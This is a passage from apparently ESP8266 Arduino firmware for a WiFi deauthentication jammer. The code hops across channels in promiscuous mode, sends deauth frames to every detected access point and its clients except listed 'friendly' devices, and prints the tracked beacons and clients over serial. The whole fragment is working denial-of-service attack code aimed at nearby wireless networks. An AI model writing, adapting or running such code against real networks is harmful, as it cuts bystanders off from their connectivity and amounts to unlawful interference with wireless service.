                deauth(clients_known[uc].station, clients_known[uc].bssid, clients_known[uc].seq_n);
                break;
              }
            }
            if (!friendly_device_found) deauth(broadcast2, aps_known[ua].bssid, 128);
            friendly_device_found = false;
          }
        }
        wifi_promiscuous_enable(0);
        wifi_set_promiscuous_rx_cb(promisc_cb);
        wifi_promiscuous_enable(1);

        channel++;
        if (channel == 15) break;
        wifi_set_channel(channel);
      }
      delay(1);

      if ((Serial.available() > 0) && (Serial.read() == '\n')) {
        Serial.println("\n-------------------------------------------------------------------------\n");
        for (int u = 0; u < aps_known_count; u++) print_beacon(aps_known[u]);
        for (int u = 0; u < clients_known_count; u++) print_client(clients_known[u]);
        Serial.println("\n-------------------------------------------------------------------------\n");
      }
    }
  }
}

